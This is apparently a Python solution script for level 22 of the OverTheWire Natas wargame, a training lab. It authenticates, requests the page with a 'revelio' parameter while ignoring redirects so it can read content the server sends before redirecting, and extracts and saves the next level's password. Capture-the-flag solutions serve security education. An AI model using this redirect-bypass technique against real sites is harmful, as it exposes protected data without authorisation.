import re, requests, base64, natas

B64 = 'Basic %s' % base64.b64encode('%s:%s' % ('natas22', natas.get_credential('natas22')))
URL = 'http://natas22.natas.labs.overthewire.org?revelio'

def main():
    response = requests.get(
            URL,
            headers=dict(Authorization=B64),
            allow_redirects=False
    )

    regex = r"Password: (\w+)"
    matches = re.finditer(regex,response.content,re.MULTILINE)

    for match in matches:
        print('found password: %s' % match.group(1))
        print('adding to credentials....')
        natas.save_credentials('natas23',match.group(1))
        print('done')
        break

if __name__ == '__main__':
    main()
